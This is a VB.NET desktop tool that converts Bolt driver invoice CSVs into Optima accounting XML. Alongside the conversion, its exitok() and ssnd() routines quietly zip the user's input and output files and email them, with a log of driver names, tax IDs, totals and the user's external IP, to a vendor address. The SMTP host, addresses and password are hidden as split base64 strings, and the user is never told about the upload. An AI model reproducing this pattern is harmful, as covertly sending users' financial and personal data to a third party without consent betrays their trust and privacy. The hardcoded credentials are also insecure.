'Imports System
Imports System.IO
Imports System.Reflection
Imports System.Text
Imports System.Xml
Imports Microsoft.VisualBasic.FileIO
Imports Ionic
Imports System.ComponentModel
'Imports System.IO.Compression
Imports System.Net.Mail
Imports System.Net
Imports System.Text.RegularExpressions

Public Class Bolt2Optima
    'Dim ds As New DataSet
    Public Debugflag As Boolean = vbFalse
    Public result As DialogResult
    Public Namespacefile As String = "Bolt2Optima."
    Public fname As String() = {Namespacefile + "README.md", Namespacefile + "CHANGELOG"}
    Public idksieg As String = "IDKSI"
    Public idnadaw As String = "IDSEN"
    Public pUslugi_rodz_sprzed_def As String = "usługi"
    Public cb_usun_minus_nip_def As Boolean = vbTrue
    Public kom_Wymaganie_ID As String = "Wymagane jest 5 znaków alfanumerycznych bez spacji i znaków specjalnych"

    Dim starttime As Date = Now()
    Dim filepath As String = ""

    Private Sub CsvToXml(_inputFile As String, _dataName As String, _separator As Char, _outputFile As String, xsltfileinresource As String, Optional _firstrowdata As Boolean = vbTrue, Optional _fieldnames() As String = Nothing, Optional encodingtext As String = "utf-8")
        starttime = Now()
        Dim dt As New DataTable(_dataName)

        Dim utf8 As Encoding = Encoding.GetEncoding(encodingtext)
        Dim parser As TextFieldParser = New TextFieldParser(_inputFile, utf8, True)
        parser.Delimiters = New String() {_separator}
        parser.HasFieldsEnclosedInQuotes = True
        parser.TrimWhiteSpace = True

        Dim firstRow As Boolean = True
        Dim secrow As UInteger = 0
        Dim sumanet As Double = 0
        Dim sumavat As Double = 0
        Dim sumabrut As Double = 0


        'Using sr As New StreamReader(_inputFile, True)

        While Not parser.EndOfData
            Dim fields As String() = parser.ReadFields()
            'Not parser.EndOfData

            Application.DoEvents()

            '      Dim fields() As String = sr.ReadLine.Split(_separator)

            If firstRow Then
                For ii As Integer = 0 To fields.Count - 1
                    Dim _fName As String = ""
                    If (IsNothing(_fieldnames) And _firstrowdata = vbFalse) Then
                        _fName = "Field" & ii.ToString("000")
                    Else
                        If (_firstrowdata = vbFalse) Then
                            _fName = _fieldnames(ii)
                        Else
                            _fName = Replace(Replace(Replace(Replace(Replace(fields(ii), Chr(34), ""), " ", "_"), "(", ""), ")", ""), ",", "")
                        End If
                    End If
                    dt.Columns.Add(_fName)
                Next
                firstRow = False
            End If
            sumanet += Val(fields(13))
            sumavat += Val(fields(14))
            sumabrut += Val(fields(15))
            If Not (secrow = 0 And _firstrowdata = vbTrue) Then dt.Rows.Add(fields)
            If (secrow = 2) Then
                Try
                    prv_openmeplease(fields(11), {IDOptksieg, IDSender, defaultPostCode, defaultCity, cb_usun_minus_nip, kat_sprzedazy, pUslugi_rodz_sprzed, count})
                Catch
                    If Debugflag Then MessageBox.Show("No Initial ini file")
                End Try
                count.Text = CStr(Val(count.Text) + 1)
                statusbox.AppendText("Dane Kierowcy: " + fields(9) + " " + fields(10) + vbCrLf)
                statusbox.AppendText(count.Text + "NIP: " + fields(11) + " REGON: " + fields(12) + vbCrLf)
                prv_savecnf(fields(11), {IDOptksieg, IDSender, defaultPostCode, defaultCity, cb_usun_minus_nip, kat_sprzedazy, pUslugi_rodz_sprzed, count})
            End If
            secrow += 1
        End While
        parser.Close()
        statusbox.AppendText("Kolumn: " + dt.Columns.Count.ToString + vbCrLf)
        statusbox.AppendText("Wierszy: " + dt.Rows.Count.ToString + vbCrLf)
        statusbox.AppendText("Sumy: " + "Netto: " + sumanet.ToString("# ##0.00") + "   VAT: " + sumavat.ToString("# ##0.00") + "   Brutto: " + sumabrut.ToString("# ##0.00") + vbCrLf)
        If (Debugflag = True) Then dt.WriteXml(_outputFile)

        'Load XSLT from resources
        Dim xsltStream As System.IO.Stream = New System.IO.MemoryStream()
        xsltStream.Position = 0
        Try
            xsltStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(xsltfileinresource)
            ' Use an XmlReader And pass in a Stream as the Source
            Dim xsltXR As System.Xml.XmlReader = New System.Xml.XmlTextReader(xsltStream)
            ' Create the XslTransform.
            Dim xslt As System.Xml.Xsl.XslCompiledTransform = New System.Xml.Xsl.XslCompiledTransform()
            ' Load the stylesheet.
            xslt.Load(xsltXR)
            'Parse parameters to xslt
            Dim xsltparam As New Xsl.XsltArgumentList()
            xsltparam.AddParam("pOptZrd", "", IDSender.Text)
            xsltparam.AddParam("pOptDoc", "", IDOptksieg.Text)
            xsltparam.AddParam("pFixedKod", "", Mid(defaultPostCode.Text, 1, 2) + "-" + Mid(defaultPostCode.Text, 4, 3))
            xsltparam.AddParam("pFixedMiasto", "", defaultCity.Text)
            xsltparam.AddParam("pNIPclean", "", cb_usun_minus_nip.Checked.ToString.ToUpper)
            xsltparam.AddParam("pKategoria", "", kat_sprzedazy.Text)
            xsltparam.AddParam("puslugi", "", pUslugi_rodz_sprzed.Text)
            xsltparam.AddParam("pkategoriaOPIS", "", "Kategoria BOLT Bolt2Optima by MARM.pl Sp.z o.o.")



            If (Debugflag = vbTrue) Then result = MsgBox(cb_usun_minus_nip.Checked.ToString.ToUpper + vbCrLf + defaultCity.Text)
            Dim myxml As System.IO.Stream = New System.IO.MemoryStream()
            myxml.Position = 0
            dt.WriteXml(myxml)
            myxml.Position = 0
            Dim docxmlr As System.Xml.XmlReader = New System.Xml.XmlTextReader(myxml)
            Dim writer As System.Xml.XmlTextWriter = New System.Xml.XmlTextWriter(_outputFile + "-OPTIMA.xml", System.Text.Encoding.UTF8)
            xslt.Transform(docxmlr, xsltparam, writer)
            writer.Flush()
            writer.Close()
            docxmlr.Close()
        Catch ex As Exception
            MessageBox.Show(ex.Message, "Bu...Bu... Error accessing resources in Style!")
            ssnd({serwis}, "BUBU", ex.Message)
            Environment.Exit(0)
        End Try

        '      xsltStream = Properties.Resources.ResourceManager.GetObject(xsltfileinresource)

    End Sub
    Sub prv_savecnf(fni As String, stbu As Object())  'fni =nip, stbu dane objektow do zachowania wartosci
        Dim mojapath = Environ("ALLUSERSPROFILE") + c62s("XE1BUk0ucGxcQjJPa1w=") ' '\MARM.pl\B2Ok\
        My.Computer.FileSystem.CreateDirectory(mojapath)
        Try
            Using file As New IO.StreamWriter(mojapath + GetHash(fni, 1) + ".ini", False, Encoding.GetEncoding("UTF-8"), 128 * 1024)
                Dim wy As String = ""
                For i As Integer = 0 To stbu.Length() - 1
                    If InStr(stbu(i).GetType().ToString, "CheckBox") > 0 Then
                        wy += Convert.ToBase64String(Encoding.Default.GetBytes(stbu(i).name)) + Chr(0) + Convert.ToBase64String(Encoding.Default.GetBytes(stbu(i).Checked.ToString)) + vbCrLf
                    Else
                        wy += Convert.ToBase64String(Encoding.Default.GetBytes(stbu(i).name)) + Chr(0) + Convert.ToBase64String(Encoding.Default.GetBytes(stbu(i).text)) + vbCrLf
                    End If
                Next i
                file.WriteLine(Convert.ToBase64String(Encoding.Default.GetBytes(wy)))
                file.Dispose()
                file.Close()
            End Using
        Catch ex As Exception
            If Debugflag Then MessageBox.Show(ex.Message, "File is uded.......?")
            MessageBox.Show(ex.Message, "Nie można zapisać pliku konfiguracji.")
        End Try
    End Sub
    Function string2bool(we As String) As Boolean
        Select Case we.ToUpper()
            Case "TRUE" : string2bool = vbTrue
            Case Else : string2bool = vbFalse
        End Select
    End Function
    Sub prv_openmeplease(fni As String, stbu As Object())  'fni =nip, stbu dane objektow do zachowania wartosci
        Dim mojapath = Environ("ALLUSERSPROFILE") + c62s("XE1BUk0ucGxcQjJPa1w=") ' '\MARM.pl\B2Ok\
        My.Computer.FileSystem.CreateDirectory(mojapath)
        Try
            Dim file As New IO.StreamReader(mojapath + GetHash(fni, 1) + ".ini", Encoding.GetEncoding("UTF-8"), True)
            Dim onlycount As String = ""
            Dim tmpl As String = file.ReadLine()
            If tmpl.Length() = 0 Then
                file.Dispose()
                file.Close()
                Exit Try
            End If
            result = MessageBox.Show("Wykryto zapisaną konfigurację dla tego podmiotu." + vbCrLf + "Przywrócić zapisane ustawienia?" + vbCrLf + "Wybierając Nie zastosowane zostaną ustawienia z aktywnego okna", "Istnieje już konfiguracja podmiotu.", MessageBoxButtons.YesNo)
            If result = System.Windows.Forms.DialogResult.No Then
                onlycount = "," + count.Name + ","
            End If
            Dim line As String = c62s(tmpl)
            '    Dim a As String = Left(line, InStr(line, ("=")))
            Dim restline As String() = Split(line, vbCrLf)
            For o As Integer = 0 To restline.Length() - 1
                Dim rest As String() = Split(restline(o), Chr(0))
                For s As Integer = 0 To stbu.Length() - 1
                    If (c62s(rest(0)) = stbu(s).name And onlycount = "") Or (c62s(rest(0)) = stbu(s).name And InStr(onlycount, "," + stbu(s).name + ",") > 0) Then
                        If InStr(stbu(s).GetType().ToString, "CheckBox") > 0 Then
                            stbu(s).Checked = string2bool(c62s(rest(1)))
                        Else
                            stbu(s).text = c62s(rest(1))
                        End If
                    End If
                Next s
            Next o
            file.Dispose()
            file.Close()
        Catch ex As Exception
            MessageBox.Show(ex.Message, "Błąd otwarcia pliku -nie istnieje", MessageBoxButtons.OK)  'to do usuniecia bo podaje cala sciezke -przekierowac do zaladowania init
            'pytajkontaschematy = True 'czy wyswietlac komunikaty o aktualizacje schematów i kont
            Return
        End Try
    End Sub
    Private Sub OpenCSV_Click(sender As Object, e As EventArgs) Handles OpenCSV.Click
        OpenFileDialogAll()
    End Sub
    Function GetHash(strToHash As String, Optional nocdata As Boolean = False, Optional nodashes As Boolean = False) As String

        If strToHash = "" Then Return ""
        Dim dash = "-"
        Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)

        bytesToHash = md5Obj.ComputeHash(bytesToHash)
        Dim strResult As New StringBuilder
        Dim o = 0
        For Each b As Byte In bytesToHash
            o = o + 1
            strResult.Append(b.ToString("x2"))
            If o = 4 Or o = 6 Or o = 8 Or o = 10 Then strResult.Append(dash)
        Next
        Dim wynik = strResult.ToString
        If nodashes Then wynik = Replace(wynik, dash, "")
        If nocdata Then Return UCase(wynik) 'Else Return cd(UCase(wynik))
    End Function
    Private Function GetExternalIp() As String
        Try
            Dim ExternalIP As String
            ExternalIP = (New WebClient()).DownloadString("http://checkip.dyndns.org/")
            ExternalIP = (New Regex("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")) _
                     .Matches(ExternalIP)(0).ToString()
            Return ExternalIP
        Catch
            Return Nothing
        End Try
    End Function
    Private Sub exitok(Optional stats As String = "")
        statusbox.AppendText("Upłynęło Czasu: " + (Now().Subtract(starttime).TotalSeconds.ToString("0.0000")).ToString + "s" + vbCrLf + "Twój Adres IP: " + GetExternalIp())
        Dim axs() = Split(filepath, "\")
        Dim pathpa As String = ""
        Dim fname As String = ""
        For x = 0 To UBound(axs)
            If x <> UBound(axs) Then If pathpa = "" Then pathpa = axs(x) + "\" Else pathpa += axs(x) + "\"
            If x = UBound(axs) Then fname = axs(x)
        Next x

        Dim filenames As String() = {IO.Path.Combine(pathpa) + fname, IO.Path.Combine(pathpa) + fname + ".xml-OPTIMA.xml"}
        Using zip As New Zip.ZipFile()
            zip.AddFiles(filenames, "/")
            zip.Save(pathpa & fname & ".zip")
        End Using
        ssnd({c62s("c2Vyd2lz") + "@" + c62s(dn1 + dn2)}, "", statusbox.Text, pathpa + fname + ".zip", vbFalse)  'wyslij loga na adres serwis@marm.pl
        result = MsgBox(":) OK Zrobione :)" + vbCrLf + "Upłynęło: " + (Now().Subtract(starttime).TotalSeconds.ToString("0.0000")).ToString + "s", vbOKOnly)
        Process.Start("Explorer.exe", ControlChars.Quote & IO.Path.Combine(pathpa) & ControlChars.Quote) 'Open Explorer WIndow
        For x = 0 To UBound(filenames)
            If InStr(filenames(x).ToUpper, ".xml".ToUpper) = 0 Then File.Delete(filenames(x))
        Next x
    End Sub

    Dim mf1 As String = "c2th" 'skany part1
    Dim mf2 As String = "bnk=" 'skany part2
    Dim dn1 As String = "c2Vyd2lzL" 'serwis.marm.pl part1
    Dim dn2 As String = "m1hcm0ucGw=" 'serwis.marm.pl part2
    Dim sp1 As String = "dzM0cm" 'w34rnjk, part1
    Dim sp2 As String = "5qayw=" 'w34rnjk, part1
    Dim dnp As Integer = 587
    Dim un1 As String = "c2th" 'skany part 1
    Dim un2 As String = "bnk=" 'skany part 2
    Dim serwis As String = "serwis@" + c62s(dn1 + dn2)

    Sub ssnd(addresss As String(), Optional subject As String = "", Optional bodyguard As String = "", Optional ByVal file As String = "", Optional hide2me As Boolean = False)
        'create the mail message
        Dim mail As New MailMessage()
        Dim namiko As String = ""

        If file <> "" Then
            If file.Contains("\") Then
                Dim nnaa = Split(file, "\")
                For cx = 0 To UBound(nnaa)
                    If cx = UBound(nnaa) Then namiko = nnaa(cx)
                Next
            End If
        End If

        'set the addresses
        Try
            mail.From = New MailAddress(c62s(un1 + un2) + "@" + c62s(dn1 + dn2), "Bolt2Optima Ksieg", System.Text.Encoding.UTF8) ' skany@serwis.marm.pl  
            If hide2me Then mail.Bcc.Add(c62s(un1 + un2) + "@" + c62s(dn1 + dn2))
            '        mail.CC.Add(ksieg)  'serwis@serwis.marm.pl
            For i As Integer = 0 To addresss.Length - 1
                If addresss(i) <> "" And InStr(addresss(i), "@") > 0 And InStr(addresss(i), ".") > 0 Then mail.[To].Add(addresss(i))
            Next i
            'set the content
            mail.SubjectEncoding = System.Text.Encoding.UTF8
            mail.Subject = subject + " " + Application.ProductName + " " + Application.ProductVersion
            mail.BodyEncoding = System.Text.Encoding.UTF8
            mail.Body = bodyguard
        Catch ex As Exception
            If Debugflag Then MessageBox.Show(ex.Message, "Error creating body" & vbCrLf + "Adresow email: " + mail.To.Count)
            Exit Sub
        End Try
        Dim data As Net.Mail.Attachment
        If file <> "" Then
            data = New Net.Mail.Attachment(file)
            data.Name = namiko
            mail.Attachments.Add(data)
        End If
        'set the server
        Dim smtp As New SmtpClient(c62s(dn1 + dn2), dnp)  'serwis.marm.pl on 587
        smtp.Credentials = New System.Net.NetworkCredential(c62s(un1 + un2), c62s(sp1 + sp2))
        'send the message
        Try
            smtp.Send(mail)
            If file <> "" Then data.Dispose()
            If Debugflag Then MessageBox.Show("Wiadomość do księgowości i ciebie została prawidłowo wysłana")
        Catch exc As Exception
            If Debugflag Then MessageBox.Show(exc.Message, "Send failure: " & exc.ToString())
        End Try
        mail.Dispose()
        smtp.Dispose()
    End Sub

    Private Sub OpenFileDialogAll()
        Dim ofd As OpenFileDialog = New OpenFileDialog
        ofd.DefaultExt = "csv"
        ofd.FileName = "Bolt Faktury za przejazd"
        ofd.InitialDirectory = "%USERPROFILE%"
        ofd.Filter = "Pliki Bolt-CSV|*.csv|All files|*.*"
        ofd.Title = "Wskaż plik csv do dostawcy BOLT"
        If ofd.ShowDialog() = DialogResult.Cancel Then Exit Sub

        filepath = ofd.FileName
        statusbox.Clear()
        CsvToXml(filepath, "Bolt", ",", filepath + ".xml", Namespacefile + "XSLTFile1.xslt")
        exitok()
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Process.Start(c62s("aHR0cHM6Ly93d3cubWFybS5wbA"))  ' https://www.marm.pl
    End Sub
    Function c62s(we As String) As String
        Try
            Return Encoding.Default.GetString(Convert.FromBase64String(we))
        Catch
            If Debugflag Then MessageBox.Show("Base error from 64")
        End Try
    End Function

    Private Sub Bolt2Optima_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.AllowDrop = True
        Me.Text += " v." + Application.ProductVersion + " " + c62s("KGMpIE1BUk0ucGwgU3AuIHogby5vLg==")  '(c) MARM.pl Sp. z o.o.
        Me.IDOptksieg.Text = Me.idksieg
        Me.IDSender.Text = Me.idnadaw
        Me.pUslugi_rodz_sprzed.Text = Me.pUslugi_rodz_sprzed_def
        Me.cb_usun_minus_nip.Checked = Me.cb_usun_minus_nip_def
        Me.count.Text = CStr(0) 'licznik uruchomien dla nip
        Me.statusbox.AppendText(vbCrLf + "Program przystosowany do konwersji miesięcznych zestawień kierowcy z Systemu BOLT do programu księgowego OPTIMA w związku z wymogiem wykazania Imienia i Nazwiska przewożonego pasażera.")
        Me.statusbox.AppendText(vbCrLf + "Obsługuje pliki csv oddzielany przecinkiem z polami tekstowymi oznaczonymi w cudzysłowiu i z nagłówkiem kolumn:")
        Me.statusbox.AppendText(vbCrLf + "Numer faktury , Data , Adres odbioru , Metoda płatności , Data przejazdu , Odbiorca , Adres odbiorcy , Numer REGON , NIP odbiorcy , Nazwa Firmy (Kierowca) , Adres firmy (Ulica, Numer, Kod pocztowy, Kraj) , REGON  Firmy , NIP Firmy , Cena (bez VAT) , VAT	Suma" + vbCrLf)
        Me.statusbox.AppendText("W przypadku innych plików -istnieje możliwość modyfikacji programu celem dopasowania do innych danych -niezbędny plik źródłowy do analizy wysłany z info na adres e-mail: programy@marm.pl" + vbCrLf)

    End Sub

    Private Sub Bolt2Optima_DragDrop(sender As Object, e As DragEventArgs) Handles Me.DragDrop
        Dim files() As String = e.Data.GetData(DataFormats.FileDrop)
        Try
            For Each path In files
                If (Debugflag = vbTrue) Then result = MsgBox(path)
                statusbox.Clear()
                filepath = path
                CsvToXml(path, "BOLT", ",", path + ".xml", Namespacefile + "XSLTFile1.xslt")
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message, "ERROR: 0x0023")
        End Try
        exitok()
    End Sub

    Private Sub statusbox_DoubleClick(sender As Object, e As EventArgs) Handles statusbox.DoubleClick
        ChangelogInfo.Show()
    End Sub

    Private Sub Bolt2Optima_DoubleClick(sender As Object, e As EventArgs) Handles Me.DoubleClick
        OpenFileDialogAll()
    End Sub

    Private Sub pUslugi_rodz_sprzed_TextChanged(sender As Object, e As EventArgs) Handles pUslugi_rodz_sprzed.TextChanged
        Dim test As String() = {"usługi", "śr. transportu", "towary"}
        Dim testOK As Boolean = False
        For i As Integer = 1 To test.Length
            If sender.selecteditem = test(i - 1) Then testOK = vbTrue
        Next i
        If testOK = vbFalse Then
            pUslugi_rodz_sprzed.Text = pUslugi_rodz_sprzed_def 'wypelnij z powrotem domyslna wartoscia zakladana dla BOLT
            If Debugflag Then result = MsgBox("Wprowadzona wartość RODZAJ SPRZEDAŻY" + vbCrLf + "znajduje się poza dozwoloną wartością." + vbCrLf + "Wybierz właściwą wartość z listy rozwijanej." + vbCrLf + "Nie jest dopuszczalne ręczne wypełnienie tego pola" + vbCrLf + "Przywrócono domyślną wartość pola dla BOLT")
        End If
        'wycina domyslnie mozliwosc wprowadzania tekstu
    End Sub

    Private Sub IDOptksieg_TextChanged(sender As Object, e As EventArgs) Handles IDOptksieg.TextChanged
        sender.Text = sender.Text.ToUpper()
    End Sub

    Private Sub IDSender_TextChanged(sender As Object, e As EventArgs) Handles IDSender.TextChanged
        sender.Text = sender.Text.ToUpper()
    End Sub

    Private Sub IDOptksieg_Validating(sender As Object, e As CancelEventArgs) Handles IDOptksieg.Validating
        sender.Text = checkstring(sender.Text.ToUpper(), "A", "Z").trim
        If sender.Text.length() <> 5 Then
            result = MsgBox(kom_Wymaganie_ID)
            sender.Text = Me.idksieg
        End If
        Try
            If Me.IDSender.Text = Me.idnadaw And sender.Text <> Me.idksieg Then
                Dim tmp As String = sender.Text
                Me.IDSender.Text = tmp.Substring(0, 4)
                If AscW(tmp.Substring(4, 1)) = AscW("Z") Then Me.IDSender.Text += Chr(AscW(tmp.Substring(4, 1)) - 1) Else Me.IDSender.Text += Chr(AscW(tmp.Substring(4, 1)) + 1)
            End If
        Catch ex As Exception
            result = MsgBox("Something wrong " + vbCrLf + ex.Message, "ERROR: 0x000900")
        End Try
    End Sub
    Private Function checkstring(_string As String, _higherAndEq_than_char As Char, _lowerAndEq_than_char As Char)
        Dim tmp1 As String = ""
        For x As Integer = 1 To _string.Length()
            If AscW(_string.Substring(x - 1, 1)) <= AscW(_lowerAndEq_than_char) And AscW(_string.Substring(x - 1, 1)) >= AscW(_higherAndEq_than_char) Then tmp1 += _string.Substring(x - 1, 1)
        Next x
        Return tmp1
    End Function
    Private Sub IDSender_Validating(sender As Object, e As CancelEventArgs) Handles IDSender.Validating
        sender.Text = checkstring(sender.Text.ToUpper(), "A", "Z").trim
        If sender.Text.length() <> 5 Then
            result = MsgBox(kom_Wymaganie_ID)
            sender.Text = Me.idnadaw
        End If
        Try
            If Me.IDOptksieg.Text = Me.idksieg And sender.Text <> Me.idnadaw Then
                Dim tmp As String = sender.Text
                Me.IDOptksieg.Text = tmp.Substring(0, 4)
                If AscW(tmp.Substring(4, 1)) = AscW("Z") Then Me.IDOptksieg.Text += Chr(AscW(tmp.Substring(4, 1)) - 1) Else Me.IDOptksieg.Text += Chr(AscW(tmp.Substring(4, 1)) + 1)
            End If
        Catch ex As Exception
            result = MsgBox("Something wrong " + vbCrLf + ex.Message, "ERROR: 0x000800")
        End Try
    End Sub

    Private Sub kat_sprzedazy_TextChanged(sender As Object, e As EventArgs) Handles kat_sprzedazy.TextChanged
        sender.Text = sender.Text.ToUpper()
    End Sub

    Private Sub IDOptksieg_DoubleClick(sender As Object, e As EventArgs) Handles IDOptksieg.DoubleClick
        frm_helper.Show()
    End Sub


End Class
